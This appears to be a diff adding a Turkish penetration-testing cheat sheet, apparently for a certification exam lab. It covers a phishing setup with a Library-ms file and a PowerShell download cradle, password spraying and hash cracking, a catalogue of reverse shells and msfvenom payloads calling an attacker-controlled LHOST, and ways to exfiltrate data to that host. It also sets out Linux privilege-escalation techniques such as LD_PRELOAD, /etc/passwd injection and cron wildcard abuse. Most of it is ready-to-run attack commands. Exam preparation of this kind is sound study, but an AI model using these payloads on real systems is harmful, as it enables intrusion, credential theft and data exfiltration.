+<td>Webmin</td>
+<td>1.890–1.920</td>
+<td>CVE-2019-15107</td>
+</tr>
+<tr>
+<td>Windows SMBv1</td>
+<td>2008/7 yamasız</td>
+<td>MS17-010 (EternalBlue)</td>
+</tr>
+<tr>
+<td>Grafana</td>
+<td>8.0.0–8.3.0</td>
+<td>CVE-2021-43798 path traversal</td>
+</tr>
+<tr>
+<td>Elasticsearch</td>
+<td>1.4.x</td>
+<td>CVE-2015-1427</td>
+</tr>
+</tbody>
+</table>
+<h2 id="411-exploit-bulma-ve-uyarlama">4.11 Exploit bulma ve uyarlama</h2>
+<pre><code class="language-bash">searchsploit &quot;&lt;ürün&gt; &lt;sürüm&gt;&quot;
+searchsploit -m &lt;EDB-ID&gt;          # kopyala
+searchsploit -x &lt;EDB-ID&gt;          # oku
+# GitHub'da: &quot;&lt;CVE&gt; poc&quot; — ama önce kodu OKU
+</code></pre>
+<p>Çalıştırmadan önce her zaman: <strong>(1)</strong> kodu oku — ne yapıyor, LHOST/LPORT/URL/path nerede? <strong>(2)</strong> Python 2 mi 3 mü? <strong>(3)</strong> Hedef sürümle uyumlu mu? <strong>(4)</strong> Varsayılan kullanıcı/parola/path değiştirilmeli mi? Hata verirse hata mesajını oku: çoğu zaman eksik modül, yanlış path veya HTTPS/HTTP farkıdır. <strong>Değiştirdiğin her satırı rapor için not al.</strong></p>
+<pre><code class="language-bash"># Windows exploit'i Kali'de derleme
+x86_64-w64-mingw32-gcc exploit.c -o exploit.exe          # 64-bit
+i686-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32   # 32-bit + winsock
+</code></pre>
+<h2 id="412-i̇stemci-tarafı-saldırılar-e-posta-phishing-senaryosu">4.12 İstemci tarafı saldırılar (e-posta / phishing senaryosu)</h2>
+<p>Hedef ortamda SMTP varsa ve "bir kullanıcı e-postaları okuyor" ipucu varsa:</p>
+<pre><code class="language-bash"># 1) WebDAV sunucusu
+pip3 install wsgidav
+mkdir ~/webdav &amp;&amp; wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root ~/webdav/
+</code></pre>
+<p><code>config.Library-ms</code> dosyası (kullanıcı açınca senin WebDAV'ını Explorer'da gösterir):</p>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;libraryDescription xmlns=&quot;http://schemas.microsoft.com/windows/2009/library&quot;&gt;
+&lt;name&gt;@windows.storage.dll,-34582&lt;/name&gt;&lt;version&gt;6&lt;/version&gt;
+&lt;isLibraryPinned&gt;true&lt;/isLibraryPinned&gt;&lt;iconReference&gt;imageres.dll,-1003&lt;/iconReference&gt;
+&lt;templateInfo&gt;&lt;folderType&gt;{7d49d726-3c21-4f05-99aa-fdc2c9474656}&lt;/folderType&gt;&lt;/templateInfo&gt;
+&lt;searchConnectorDescriptionList&gt;&lt;searchConnectorDescription&gt;
+&lt;isDefaultSaveLocation&gt;true&lt;/isDefaultSaveLocation&gt;&lt;isSupported&gt;false&lt;/isSupported&gt;
+&lt;simpleLocation&gt;&lt;url&gt;http://<span class="ph">LHOST</span>&lt;/url&gt;&lt;/simpleLocation&gt;
+&lt;/searchConnectorDescription&gt;&lt;/searchConnectorDescriptionList&gt;
+&lt;/libraryDescription&gt;
+</code></pre>
+<p>WebDAV klasörüne bir <strong>.lnk</strong> koy (Windows makinede oluşturulur; hedef olarak):
+<code>powershell.exe -c "IEX(New-Object Net.WebClient).DownloadString('http://LHOST:8000/powercat.ps1'); powercat -c LHOST -p 443 -e powershell"</code></p>
+<pre><code class="language-bash"># 2) E-posta ile gönder
+swaks -t user@$DOMAIN --from it@$DOMAIN --server $IP --auth LOGIN --auth-user $USER --auth-password $PASS \
+      --header &quot;Subject: Config&quot; --body &quot;Lütfen ekteki dosyayı açın.&quot; --attach @config.Library-ms
+</code></pre>
+<p>Office makrosu senaryosunda: <code>.doc</code> (makro destekli eski format) içine <code>AutoOpen</code>/<code>Document_Open</code> → PowerShell download cradle.</p>
+<hr />
+<h1 id="5-parolalar-ve-hashler">5. Parolalar ve hash'ler</h1>
+<h2 id="51-brute-force-ve-spray">5.1 Brute force ve spray</h2>
+<pre><code class="language-bash">hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://$IP -t 4
+hydra -L users.txt -P pass.txt ftp://$IP
+hydra -l admin -P rockyou.txt $IP http-post-form &quot;/login.php:user=^USER^&amp;pass=^PASS^:F=Invalid&quot;
+hydra -l admin -P rockyou.txt $IP http-get /admin/          # Basic auth
+hydra -l administrator -P pass.txt rdp://$IP -t 1
+
+# Domain spray: önce politika!
+nxc smb $DC -u $USER -p $PASS --pass-pol
+nxc smb $DC -u users.txt -p 'Winter2026!' --continue-on-success
+kerbrute passwordspray -d $DOMAIN --dc $DC users.txt 'Winter2026!'
+</code></pre>
+<p>Kural: kilitlenme eşiği varsa, kullanıcı başına eşik−1 deneme, sonra gözlem süresi kadar bekle. Brute force son çaredir; önce <strong>bağlamdan parola üret</strong>:</p>
+<pre><code class="language-bash">cewl http://$IP -d 2 -m 5 -w cewl.txt                       # siteden kelime listesi
+hashcat --stdout cewl.txt -r /usr/share/hashcat/rules/best64.rule &gt; mutated.txt
+# Kendi kuralın:  c $1 $! → İlk harf büyük + &quot;1!&quot;   (echo 'c $1 $!' &gt; my.rule)
+</code></pre>
+<h2 id="52-hash-türleri">5.2 Hash türleri</h2>
+<table>
+<thead>
+<tr>
+<th>Hash</th>
+<th>Görünüm</th>
+<th>hashcat <code>-m</code></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>NTLM</td>
+<td><code>31d6cfe0d16ae931b73c59d7e0c089c0</code></td>
+<td>1000</td>
+</tr>
+<tr>
+<td>NetNTLMv2</td>
+<td><code>user::DOMAIN:1122..:...</code></td>
+<td>5600</td>
+</tr>
+<tr>
+<td>Kerberoast (RC4)</td>
+<td><code>$krb5tgs$23$*...</code></td>
+<td>13100</td>
+</tr>
+<tr>
+<td>AS-REP</td>
+<td><code>$krb5asrep$23$...</code></td>
+<td>18200</td>
+</tr>
+<tr>
+<td>MD5 / SHA1 / SHA256</td>
+<td>32 / 40 / 64 hex</td>
+<td>0 / 100 / 1400</td>
+</tr>
+<tr>
+<td>md5crypt / sha512crypt</td>
+<td><code>$1$</code> / <code>$6$</code></td>
+<td>500 / 1800</td>
+</tr>
+<tr>
+<td>bcrypt</td>
+<td><code>$2y$10$...</code></td>
+<td>3200</td>
+</tr>
+<tr>
+<td>KeePass</td>
+<td><code>$keepass$*2*...</code></td>
+<td>13400</td>
+</tr>
+<tr>
+<td>Net-NTLMv1</td>
+<td><code>user::DOMAIN:...</code></td>
+<td>5500</td>
+</tr>
+</tbody>
+</table>
+<pre><code class="language-bash">hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+hashcat -m 13100 kerb.txt rockyou.txt --show
+hashcat hash.txt --identify            # tür tespiti (hashid de olur)
+john --wordlist=rockyou.txt hash.txt ; john --show hash.txt
+</code></pre>
+<p>Önce <strong>Pass-the-Hash</strong> dene (saniyeler), sonra kır (dakikalar–saatler).</p>
+<h2 id="53-dosya-parolaları-2john">5.3 Dosya parolaları (*2john)</h2>
+<pre><code class="language-bash">ssh2john id_rsa &gt; h.txt               # parolalı SSH anahtarı
+keepass2john Database.kdbx &gt; h.txt    # KeePass (hashcat için baştaki &quot;Database:&quot; kısmını sil, -m 13400)
+zip2john backup.zip &gt; h.txt
+office2john doc.docx &gt; h.txt
+pdf2john file.pdf &gt; h.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt h.txt
+# KeePass'i aç
+keepassxc-cli ls Database.kdbx ; keepassxc-cli show -s Database.kdbx &quot;Entry Name&quot;
+</code></pre>
+<hr />
+<h1 id="6-kabuklar-shell">6. Kabuklar (shell)</h1>
+<h2 id="61-reverse-shell-kataloğu">6.1 Reverse shell kataloğu</h2>
+<p>Hedefe yapıştırırken <code>LHOST</code> ve <code>443</code>'ü değiştir. Kali tarafında: <code>rlwrap -cAr nc -lvnp 443</code>.</p>
+<pre><code class="language-bash">bash -c 'bash -i &gt;&amp; /dev/tcp/<span class="ph">LHOST</span>/443 0&gt;&amp;1'
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc <span class="ph">LHOST</span> 443 &gt;/tmp/f
+nc -e /bin/bash <span class="ph">LHOST</span> 443
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((&quot;<span class="ph">LHOST</span>&quot;,443));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;])'
+php -r '$s=fsockopen(&quot;<span class="ph">LHOST</span>&quot;,443);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'
+perl -e 'use Socket;$i=&quot;<span class="ph">LHOST</span>&quot;;$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};'
+</code></pre>
+<p><strong>Web parametresi içinden</strong> (özel karakterler sorun çıkarıyorsa) base64'le:</p>
+<pre><code class="language-bash"># Kali'de üret
+echo -n 'bash -i &gt;&amp; /dev/tcp/<span class="ph">LHOST</span>/443 0&gt;&amp;1' | base64 -w0
+# Hedefte çalıştır
+echo &lt;B64&gt; | base64 -d | bash
+</code></pre>
+<p><strong>Windows / PowerShell — en güvenilir yol: Kali'de üret, base64 UTF-16LE ile çalıştır:</strong></p>
+<pre><code class="language-bash"># Kali'de: (<span class="ph">LHOST</span> değişkenden gelir)
+cat &gt; rev.ps1 &lt;&lt;EOF
+\$c=New-Object Net.Sockets.TCPClient('$LHOST',443);\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length)) -ne 0){\$d=(New-Object Text.ASCIIEncoding).GetString(\$b,0,\$i);\$r=(iex \$d 2&gt;&amp;1|Out-String);\$r2=\$r+'PS '+(pwd).Path+'&gt; ';\$sb=([Text.Encoding]::ASCII).GetBytes(\$r2);\$s.Write(\$sb,0,\$sb.Length);\$s.Flush()};\$c.Close()
+EOF
+echo &quot;powershell -nop -w hidden -e $(iconv -t UTF-16LE rev.ps1 | base64 -w0)&quot;
+# Çıkan tek satırı hedefte (cmd, web RCE, xp_cmdshell...) çalıştır.
+</code></pre>
+<p>Alternatifler: <code>nc64.exe -e cmd.exe LHOST 443</code> (hedefe yükledikten sonra), powercat:</p>
+<pre><code class="language-powershell">IEX(New-Object Net.WebClient).DownloadString('http://<span class="ph">LHOST</span>/powercat.ps1');powercat -c <span class="ph">LHOST</span> -p 443 -e powershell
+</code></pre>
+<h2 id="62-msfvenom-her-makinede-serbest-meterpreter-hariç">6.2 msfvenom (her makinede serbest — Meterpreter hariç)</h2>
+<pre><code class="language-bash">msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f exe -o rev.exe
+msfvenom -p windows/shell_reverse_tcp     LHOST=$LHOST LPORT=443 -f exe -o rev32.exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f dll -o rev.dll
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f msi -o rev.msi
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f aspx -o rev.aspx
+msfvenom -p linux/x64/shell_reverse_tcp   LHOST=$LHOST LPORT=443 -f elf -o rev.elf
+msfvenom -p java/jsp_shell_reverse_tcp    LHOST=$LHOST LPORT=443 -f war -o rev.war
+msfvenom -p php/reverse_php               LHOST=$LHOST LPORT=443 -f raw -o rev.php
+</code></pre>
+<div class="admonition warning">
+<p class="admonition-title">Staged ↔ stageless</p>
+<p><code>windows/x64/shell_reverse_tcp</code> (alt çizgi) <strong>stageless</strong>'tır, <code>nc</code> ile yakalanır. <code>windows/x64/shell/reverse_tcp</code> (eğik çizgi) <strong>staged</strong>'dir, sadece <code>multi/handler</code> ile yakalanır. Meterpreter payload'ları Metasploit kısıtlamasına tabidir.</p>
+</div>
+<h2 id="63-linux-tty-yükseltme">6.3 Linux TTY yükseltme</h2>
+<pre><code class="language-bash">python3 -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'     # yoksa: script -qc /bin/bash /dev/null
+# Ctrl+Z
+stty raw -echo; fg
+# Enter
+export TERM=xterm-256color SHELL=/bin/bash
+stty rows 50 cols 200        # Kali'de 'stty size' ile kendi değerlerini öğren
+</code></pre>
+<p>Daha sağlam: hedefte <code>socat</code> varsa veya yükleyebiliyorsan tam TTY:</p>
+<pre><code class="language-bash">socat file:`tty`,raw,echo=0 tcp-listen:4444                           # Kali
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<span class="ph">LHOST</span>:4444    # hedef
+</code></pre>
+<p><strong>SSH erişimin varsa her şeyi bırak, SSH kullan.</strong> Yazma iznin olan bir ev dizinine <code>authorized_keys</code> bırakmak en stabil kabuktur.</p>
+<h2 id="64-windowsta-daha-iyi-kabuk">6.4 Windows'ta daha iyi kabuk</h2>
+<ul>
+<li>WinRM açık ve kimlik varsa: <code>evil-winrm</code> (upload/download dahili).</li>
+<li>RDP: <code>xfreerdp3 /v:$IP /u:$USER /p:$PASS /cert:ignore /dynamic-resolution +clipboard /drive:share,/home/kali/exam/tools</code></li>
+<li>ConPtyShell (tam etkileşimli):</li>
+</ul>
+<pre><code class="language-bash"># Kali
+stty raw -echo; (stty size; cat) | nc -lvnp 3001
+</code></pre>
+<pre><code class="language-powershell"># Hedef
+IEX(IWR http://<span class="ph">LHOST</span>/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell <span class="ph">LHOST</span> 3001
+</code></pre>
+<ul>
+<li>Elinde başka kullanıcının parolası var ama etkileşimli oturum yoksa: <strong>RunasCs</strong></li>
+</ul>
+<pre><code class="language-powershell">.\RunasCs.exe svc_user 'Passw0rd!' cmd.exe -r <span class="ph">LHOST</span>:443
+</code></pre>
+<h2 id="65-reverse-shell-gelmiyorsa">6.5 Reverse shell gelmiyorsa</h2>
+<ol>
+<li><code>LHOST</code> gerçekten tun0 IP'si mi? (<code>ip a show tun0</code>)</li>
+<li>Listener doğru portta mı? <code>ss -tlnp | grep 443</code></li>
+<li>Hedefin çıkışı filtreli olabilir: <strong>80, 443, 53</strong> ya da hedefte zaten açık bir port numarasını dene.</li>
+<li>Önce basit bağlantıyı test et: <code>curl http://LHOST/test</code> / <code>ping LHOST</code> (tcpdump ile izle).</li>
+<li>Mimari: 32-bit süreç/OS'ta x64 payload çalışmaz.</li>
+<li>Özel karakterler (<code>&amp;</code>, <code>|</code>, <code>'</code>) URL/komut içinde bozuluyor → URL-encode veya base64.</li>
+<li>Defender dosyayı siliyorsa: bellek içi PowerShell, <code>nc64.exe</code> yerine powercat; farklı payload formatı.</li>
+</ol>
+<hr />
+<h1 id="7-dosya-transferi">7. Dosya transferi</h1>
+<h2 id="71-kali-tarafında-sunucular-tmux-pencere-0da-sürekli-açık">7.1 Kali tarafında sunucular (tmux pencere 0'da sürekli açık)</h2>
+<pre><code class="language-bash">cd ~/exam/tools &amp;&amp; python3 -m http.server 80                     # indirme
+python3 -m uploadserver 8000                                       # yükleme (pip install uploadserver)
+impacket-smbserver share . -smb2support -user k -password k        # SMB (yeni Windows misafir erişimi reddeder → kullanıcı/parola kullan)
+</code></pre>
+<h2 id="72-kali-hedef">7.2 Kali → hedef</h2>
+<pre><code class="language-bash"># Linux hedef
+wget http://<span class="ph">LHOST</span>/linpeas.sh -O /tmp/lp.sh
+curl http://<span class="ph">LHOST</span>/linpeas.sh -o /tmp/lp.sh
+curl http://<span class="ph">LHOST</span>/linpeas.sh | bash                 # diske yazmadan
+# wget/curl yoksa
+exec 3&lt;&gt;/dev/tcp/<span class="ph">LHOST</span>/80; echo -e &quot;GET /pspy64 HTTP/1.0\r\n\r\n&quot; &gt;&amp;3; cat &lt;&amp;3 &gt; /tmp/p   # (HTTP başlığını sonra temizle)
+</code></pre>
+<pre><code class="language-powershell"># Windows hedef
+iwr http://<span class="ph">LHOST</span>/winPEASx64.exe -OutFile C:\Windows\Temp\wp.exe
+certutil -urlcache -split -f http://<span class="ph">LHOST</span>/nc64.exe C:\Windows\Temp\nc.exe
+curl.exe http://<span class="ph">LHOST</span>/nc64.exe -o C:\Windows\Temp\nc.exe
+IEX(New-Object Net.WebClient).DownloadString('http://<span class="ph">LHOST</span>/PowerUp.ps1')        # bellek içi
+net use \\<span class="ph">LHOST</span>\share /user:k k ; copy \\<span class="ph">LHOST</span>\share\nc64.exe C:\Windows\Temp\
+</code></pre>
+<p>evil-winrm içindeysen: <code>upload /home/kali/exam/tools/winPEASx64.exe</code> / <code>download C:\path\file</code>.</p>
+<h2 id="73-hedef-kali">7.3 Hedef → Kali</h2>
+<pre><code class="language-bash"># Linux
+curl -F 'files=@/tmp/loot.tgz' http://<span class="ph">LHOST</span>:8000/upload
+nc -lvnp 9001 &gt; loot.tgz            # Kali
+nc <span class="ph">LHOST</span> 9001 &lt; /tmp/loot.tgz       # hedef
+</code></pre>
+<pre><code class="language-powershell"># Windows
+copy C:\Windows\Temp\sam.hiv \\<span class="ph">LHOST</span>\share\
+(New-Object Net.WebClient).UploadFile('http://<span class="ph">LHOST</span>:8000/upload','C:\Windows\Temp\loot.zip')
+[Convert]::ToBase64String([IO.File]::ReadAllBytes(&quot;C:\Windows\Temp\small.txt&quot;))   # küçük dosya: kopyala-yapıştır
+</code></pre>
+<p>Bütünlüğü kontrol et: <code>md5sum</code> (Linux) ↔ <code>Get-FileHash -Algorithm MD5</code> (Windows).</p>
+<table>
+<thead>
+<tr>
+<th>Hata</th>
+<th>Çözüm</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>certutil</code> / yazma "Access denied"</td>
+<td><code>C:\Windows\Temp</code>, <code>C:\Users\Public</code> veya <code>$env:TEMP</code> kullan</td>
+</tr>
+<tr>
+<td>İndirilen dosya 0 byte / HTML</td>
+<td>http.server yanlış dizinde çalışıyor; URL'yi tarayıcıda dene</td>
+</tr>
+<tr>
+<td>SMB "guest access blocked"</td>
+<td><code>impacket-smbserver ... -user k -password k</code> + <code>net use</code></td>
+</tr>
+<tr>
+<td>Linux'ta <code>Permission denied</code> çalıştırırken</td>
+<td><code>chmod +x</code>; <code>/tmp</code> <code>noexec</code> ise <code>/dev/shm</code> veya ev dizini</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h1 id="8-linux-yetki-yükseltme">8. Linux yetki yükseltme</h1>
+<h2 id="81-sıralı-kontrol-listesi-önce-manuel-5-dk-sonra-linpeas">8.1 Sıralı kontrol listesi (önce manuel 5 dk, sonra linpeas)</h2>
+<pre><code class="language-bash">id; sudo -l                                   # 1) sudo — en sık yol
+find / -perm -4000 -type f 2&gt;/dev/null        # 2) SUID
+getcap -r / 2&gt;/dev/null                       # 3) capabilities
+cat /etc/crontab; ls -la /etc/cron.*; systemctl list-timers   # 4) cron
+ls -la /home/* /opt /var/www /srv; cat ~/.bash_history        # 5) parolalar / ilginç dosyalar
+ss -tlnp                                      # 6) sadece localhost'ta dinleyen servisler (port forward!)
+ps aux | grep -i root                         # 7) root olarak çalışan özel süreçler
+uname -a; cat /etc/os-release; sudo -V | head -1   # 8) kernel/sudo/polkit sürümü
+cat /etc/exports 2&gt;/dev/null                  # 9) NFS no_root_squash
+</code></pre>
+<pre><code class="language-bash">curl http://<span class="ph">LHOST</span>/linpeas.sh | bash | tee /tmp/lp.txt   # kırmızı-sarı: %95 privesc
+./pspy64                                                 # 2–3 dk izle: root'un periyodik komutları
+</code></pre>
+<p><strong>Localhost'ta dinleyen servis</strong> (ör. 127.0.0.1:8080) gördüysen: SSH ile <code>ssh -L 8080:127.0.0.1:8080 user@$IP</code> veya chisel/ligolo ile Kali'ye aç — çoğu zaman root olarak çalışan bir web uygulamasıdır.</p>
+<h2 id="82-sudo">8.2 sudo</h2>
+<p><code>sudo -l</code> çıktısındaki her binary için <strong>GTFOBins</strong>'e bak (<code>gtfobins.github.io</code> → "Sudo"). En sık olanlar:</p>
+<pre><code class="language-bash">sudo vim -c ':!/bin/bash'
+sudo find . -exec /bin/bash \; -quit
+sudo awk 'BEGIN {system(&quot;/bin/bash&quot;)}'
+sudo less /etc/hosts      # içinde:  !/bin/bash
+sudo python3 -c 'import os; os.system(&quot;/bin/bash&quot;)'
+sudo env /bin/bash
+sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
+sudo git -p help config   # içinde:  !/bin/bash
+sudo zip /tmp/x.zip /etc/hosts -T -TT 'bash #'
+</code></pre>
+<table>
+<thead>
+<tr>
+<th><code>sudo -l</code> çıktısında</th>
+<th>Yol</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>(ALL) NOPASSWD: /path/script.sh</code> ve script yazılabilir</td>
+<td>İçine <code>bash -p</code> ekle</td>
+</tr>
+<tr>
+<td>Script kendisi yazılamıyor ama içinde tam yolsuz komut var</td>
+<td><code>secure_path</code> yoksa PATH hijack</td>
+</tr>
+<tr>
+<td>Script içinde <code>*</code> joker</td>
+<td>wildcard injection (tar/rsync/chown)</td>
+</tr>
+<tr>
+<td><code>env_keep+=LD_PRELOAD</code></td>
+<td>Aşağıdaki LD_PRELOAD</td>
+</tr>
+<tr>
+<td><code>(ALL, !root)</code> ve sudo &lt; 1.8.28</td>
+<td><code>sudo -u#-1 /bin/bash</code> (CVE-2019-14287)</td>
+</tr>
+<tr>
+<td>Kendi parolan biliniyor ve <code>(ALL : ALL) ALL</code></td>
+<td><code>sudo -i</code> 😊</td>
+</tr>
+</tbody>
+</table>
+<p><strong>LD_PRELOAD:</strong></p>
+<pre><code class="language-c">// /tmp/x.c
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+void _init() { unsetenv(&quot;LD_PRELOAD&quot;); setgid(0); setuid(0); system(&quot;/bin/bash -p&quot;); }
+</code></pre>
+<pre><code class="language-bash">gcc -fPIC -shared -nostartfiles -o /tmp/x.so /tmp/x.c
+sudo LD_PRELOAD=/tmp/x.so &lt;sudo ile izinli herhangi bir komut&gt;
+</code></pre>
+<h2 id="83-suid-ve-capabilities">8.3 SUID ve capabilities</h2>
+<p>GTFOBins'te <strong>"SUID"</strong> bölümüne bak (sudo komutundan farklıdır: genelde <code>-p</code> gerekir).</p>
+<pre><code class="language-bash">/usr/bin/bash -p                                     # SUID bash
+find . -exec /bin/sh -p \; -quit                     # SUID find
+python3 -c 'import os; os.execl(&quot;/bin/sh&quot;,&quot;sh&quot;,&quot;-p&quot;)'  # SUID python
+env /bin/sh -p                                       # SUID env
+# SUID cp / yazılabilir /etc/passwd: root yetkili kullanıcı ekle
+openssl passwd -1 -salt x Passw0rd                   # çıktı: $1$x$...
+cp /etc/passwd /tmp/p; echo 'r00t:&lt;HASH&gt;:0:0:root:/root:/bin/bash' &gt;&gt; /tmp/p
+cp /tmp/p /etc/passwd        # (SUID cp ile)  →  su r00t
+</code></pre>
+<p>Bilinmeyen (özel) SUID binary: <code>strings</code> / <code>ltrace</code> ile çalıştırdığı komutlara bak → tam yolsuz çağrı varsa <strong>PATH hijack</strong>:</p>
+<pre><code class="language-bash">strings /usr/local/bin/backup | less
+echo -e '#!/bin/bash\n/bin/bash -p' &gt; /tmp/tar; chmod +x /tmp/tar
+PATH=/tmp:$PATH /usr/local/bin/backup
+</code></pre>
+<table>
+<thead>
+<tr>
+<th>Capability</th>
+<th>Sömürü</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>cap_setuid+ep</code> (python/perl/node…)</td>
+<td><code>python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'</code></td>
+</tr>
+<tr>
+<td><code>cap_dac_read_search</code></td>
+<td>Her dosyayı oku (<code>/etc/shadow</code>, root'un SSH anahtarı)</td>
+</tr>
+<tr>
+<td><code>cap_dac_override</code></td>
+<td>Her dosyaya yaz (<code>/etc/passwd</code>)</td>
+</tr>
+</tbody>
+</table>
+<h2 id="84-cron-ve-zamanlanmış-işler">8.4 Cron ve zamanlanmış işler</h2>
+<pre><code class="language-bash">cat /etc/crontab /etc/cron.d/*; ls -la /etc/cron.*
+./pspy64                        # crontab'da görünmeyen root işlerini yakala
+</code></pre>
+<ul>
+<li><strong>Root'un çalıştırdığı script yazılabilir:</strong> <code>echo 'cp /bin/bash /tmp/rb; chmod +s /tmp/rb' &gt;&gt; /path/script.sh</code> → bekle → <code>/tmp/rb -p</code></li>
+<li><strong>Script tam yolsuz komut çağırıyor</strong> ve crontab'daki <code>PATH</code>'te yazılabilir bir dizin önce geliyor → o dizine aynı isimde script.</li>
+<li><strong>Joker (wildcard):</strong> <code>cd /var/backups &amp;&amp; tar czf /tmp/b.tgz *</code></li>
+</ul>
+<pre><code class="language-bash">cd /var/backups
+echo 'cp /bin/bash /tmp/rb; chmod +s /tmp/rb' &gt; x.sh
+touch -- '--checkpoint=1' '--checkpoint-action=exec=sh x.sh'
+</code></pre>
+<h2 id="85-gruplar">8.5 Gruplar</h2>
+<p><code>id</code> çıktısındaki gruplara bak:</p>
+<table>
+<thead>
+<tr>
+<th>Grup</th>
+<th>Yol</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>docker</code></td>
+<td><code>docker run -v /:/mnt --rm -it &lt;mevcut imaj&gt; chroot /mnt bash</code> (<code>docker images</code> ile imaj adını öğren)</td>
+</tr>
+<tr>
+<td><code>lxd</code> / <code>lxc</code></td>
+<td>Alpine imajı içe aktar, <code>security.privileged=true</code>, <code>/</code>'yi bağla</td>
+</tr>
+<tr>
+<td><code>disk</code></td>
+<td><code>debugfs /dev/sda1</code> → <code>cat /root/.ssh/id_rsa</code></td>
+</tr>
+<tr>
+<td><code>adm</code></td>
+<td><code>/var/log/*</code> oku → loglarda parola</td>
+</tr>
+<tr>
+<td><code>shadow</code></td>
+<td><code>/etc/shadow</code> oku → kır</td>
+</tr>
+<tr>
+<td><code>sudo</code> / <code>wheel</code></td>
+<td>Kullanıcının parolasını bulursan doğrudan root</td>
+</tr>
+</tbody>
+</table>
+<h2 id="86-nfs-no_root_squash">8.6 NFS no_root_squash</h2>
+<pre><code class="language-bash"># Hedefte: cat /etc/exports   →  /srv/share *(rw,no_root_squash)
+# Kali'de (root):
+sudo mount -t nfs -o vers=3 $IP:/srv/share /mnt/nfs
+cat &gt; /tmp/r.c &lt;&lt;'EOF'
+#include &lt;unistd.h&gt;
+int main(){ setuid(0); setgid(0); execl(&quot;/bin/bash&quot;,&quot;bash&quot;,&quot;-p&quot;,NULL); }
+EOF
+sudo gcc -static /tmp/r.c -o /mnt/nfs/r &amp;&amp; sudo chmod +s /mnt/nfs/r
+# Hedefte:
+/srv/share/r
+</code></pre>
+<p>(<code>-static</code> derleme, Kali ile hedef arasındaki glibc sürüm farkı yüzünden çalışmama sorununu önler. Kali'deki <code>/bin/bash</code>'i kopyalamak bu yüzden çoğu zaman başarısız olur.)</p>
+<h2 id="87-kernel-ve-bilinen-yerel-cveler-son-çare">8.7 Kernel ve bilinen yerel CVE'ler (son çare)</h2>
+<table>
+<thead>
+<tr>
+<th>CVE</th>
+<th>Hedef</th>
+<th>Koşul</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>CVE-2021-4034 PwnKit</td>
+<td>pkexec</td>
+<td>polkit &lt; 0.120 (2022 başı öncesi neredeyse tüm dağıtımlar)</td>
+</tr>
+<tr>
+<td>CVE-2021-3156 Baron Samedit</td>
+<td>sudo</td>
+<td>1.8.2–1.8.31p2, 1.9.0–1.9.5p1</td>
+</tr>
+<tr>
+<td>CVE-2022-0847 Dirty Pipe</td>
+<td>kernel</td>
+<td>5.8 ≤ sürüm &lt; 5.16.11 / 5.15.25 / 5.10.102</td>
+</tr>
+<tr>
+<td>CVE-2023-2640 + 32629 GameOverlay</td>
+<td>Ubuntu kernel</td>
+<td>Belirli Ubuntu çekirdekleri (OverlayFS)</td>
+</tr>
+<tr>
+<td>CVE-2023-4911 Looney Tunables</td>
+<td>glibc</td>
+<td>2.34–2.38 (yamasız)</td>
+</tr>
+<tr>
+<td>CVE-2016-5195 Dirty COW</td>
+<td>kernel</td>
+<td>&lt; 4.8.3 (eski hedefler)</td>
+</tr>
+</tbody>
+</table>
+<pre><code class="language-bash">uname -r; cat /etc/os-release; dpkg -l | grep -E 'policykit|sudo |libc6'
+./linux-exploit-suggester.sh
+</code></pre>
+<p>Kernel exploit makineyi çökertebilir → önce her şeyi dene, çalıştırmadan önce kanıtlarını (local.txt) topla. Makine çökerse panelden <strong>revert</strong> gerekir (en fazla 24; bir kez sıfırlatılabilir).</p>
+<h2 id="linux-karar">8.8 Linux privesc karar tablosu</h2>
+<table>
+<thead>
+<tr>
+<th>Bulgu</th>
+<th>Yol</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>sudo -l</code> sonuç veriyor</td>
+<td>GTFOBins "Sudo" / script yazma / LD_PRELOAD</td>
+</tr>
+<tr>
+<td>Standart dışı SUID</td>
+<td>GTFOBins "SUID"; özel binary ise strings + PATH hijack</td>
+</tr>
+<tr>
+<td>Capability</td>
+<td>8.3 tablo</td>
+</tr>
+<tr>
+<td>Root cron + yazılabilir script / joker</td>
+<td>8.4</td>
+</tr>
+<tr>
+<td>docker/lxd/disk grubu</td>
+<td>8.5</td>
+</tr>
+<tr>
+<td>127.0.0.1'de servis</td>
+<td>Port forward → web uygulaması / DB</td>
+</tr>
